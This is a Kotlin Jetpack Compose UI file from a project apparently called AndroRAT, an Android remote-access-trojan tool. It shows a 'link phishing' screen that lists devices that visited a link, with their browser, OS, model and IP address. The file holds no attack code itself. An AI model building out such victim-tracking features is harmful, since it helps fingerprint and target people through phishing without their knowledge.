package com.ierusalem.androrat.features.link_phishing.presentation.components

import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.ierusalem.androrat.core.ui.components.ErrorScreen
import com.ierusalem.androrat.core.ui.components.LoadingScreen
import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
import com.ierusalem.androrat.core.utils.Resource
import com.ierusalem.androrat.features.link_phishing.data.FakeData
import com.ierusalem.androrat.features.link_phishing.data.LinkedDeviceInfo
import com.ierusalem.androrat.features.link_phishing.domain.LinkPhishingUiState

@Composable
fun LinkPhishingContent(
    modifier: Modifier = Modifier,
    uiState: LinkPhishingUiState
) {
    when (val devices = uiState.devices) {
        is Resource.Loading -> {
            LoadingScreen(modifier = modifier)
        }

        is Resource.Success -> {
            LazyColumn(
                modifier = modifier.fillMaxSize().padding(vertical = 8.dp)
            ) {
                items(devices.data!!) { deviceInfo ->
                    ExpandableCard(
                        modifier = Modifier
                            .padding(horizontal = 8.dp)
                            .padding(top = 4.dp),
                        deviceInfo = deviceInfo
                    )
                }
            }
        }

        is Resource.Failure -> {
            ErrorScreen(modifier = modifier)
        }
    }
}

@Preview
@Composable
private fun LinkPhishingContentLightPreview() {
    AndroRATTheme {
        Surface {
            LinkPhishingContent(
                uiState = LinkPhishingUiState(
                    devices = Resource.Success(
                        data = FakeData.linedDeviceList
                    )
                )
            )
        }
    }
}

@Preview
@Composable
private fun LinkPhishingContentDarkPreview() {
    AndroRATTheme(isDarkTheme = true) {
        Surface {
            LinkPhishingContent(
                uiState = LinkPhishingUiState(
                    devices = Resource.Success(
                        data = listOf(
                            LinkedDeviceInfo(
                                browser = "Yandex",
                                browserVersion = "131.0",
                                device = "Xiaomi",
                                ipAddress = "192.168.0.1",
                                isBot = false,
                                isMobile = true,
                                isPc = false,
                                isTablet = false,
                                isTouchCapable = true,
                                os = "Android",
                                osVersion = "13.0"
                            )
                        )
                    )
                )
            )
        }
    }
}